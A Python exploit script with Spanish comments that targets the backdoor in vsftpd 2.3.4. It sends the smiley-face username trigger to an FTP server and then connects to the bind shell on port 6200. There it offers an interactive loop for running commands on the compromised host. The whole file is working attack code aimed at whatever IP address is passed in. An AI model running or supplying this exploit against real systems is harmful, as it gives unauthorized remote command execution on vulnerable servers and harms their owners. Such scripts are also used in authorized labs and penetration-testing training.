#!/usr/bin/env python3

# Exploit para vsftpd 2.3.4 - backdoor bind shell
# Autor: javier@kali

import socket     # Para manejar conexiones de red
import sys        # Para acceder a argumentos del script
import time       # Para introducir pausas entre comandos

def send_trigger(target_ip, port=21):
    """
    Envía las credenciales maliciosas al servidor FTP.
    Si el servidor es vulnerable, se activará la backdoor en el puerto 6200.
    """
    print(f"[*] Conectando a {target_ip}:{port}...")
    try:
        # Crear socket TCP
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)  # Tiempo máximo de espera para conexión
        s.connect((target_ip, port))  # Conectar al servidor FTP

        # Recibir banner del servidor (mensaje de bienvenida)
        banner = s.recv(1024).decode()
        print(f"[+] Banner recibido: {banner.strip()}")

        # Enviar usuario malicioso que activa la backdoor
        s.sendall(b"USER test:)\r\n")
        time.sleep(1)

        # Enviar contraseña
        s.sendall(b"PASS test\r\n")
        time.sleep(1)

        # Cerrar conexión FTP
        s.close()
        print("[+] Trigger enviado correctamente.")
        return True

    except Exception as e:
        print(f"[!] Error al enviar el trigger: {e}")
        return False

def connect_shell(target_ip, shell_port=6200):
    """
    Intenta conectarse al puerto 6200 donde debería abrirse una shell
    si el exploit ha tenido éxito.
    """
    print(f"[*] Intentando conectar a shell en {target_ip}:{shell_port}...")
    try:
        # Crear socket TCP para la shell
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_ip, shell_port))
        print("[+] Conectado al shell. Escribe comandos...\n")

        # Bucle interactivo para enviar comandos
        while True:
            cmd = input("shell> ")
            if cmd.strip() == "exit":
                break
            s.sendall(cmd.encode() + b"\n")
            time.sleep(1)
            response = s.recv(4096)
            print(response.decode(errors="ignore"))

        s.close()

    except Exception as e:
        print(f"[!] No se pudo conectar al shell: {e}")

if __name__ == "__main__":
    # Verifica que se haya pasado la IP como argumento
    if len(sys.argv) != 2:
        print(f"Uso: python3 {sys.argv[0]} <IP objetivo>")
        sys.exit(1)

    target = sys.argv[1]

    # Ejecuta el trigger y luego intenta conectar al shell
    if send_trigger(target):
        time.sleep(2)
        connect_shell(target)
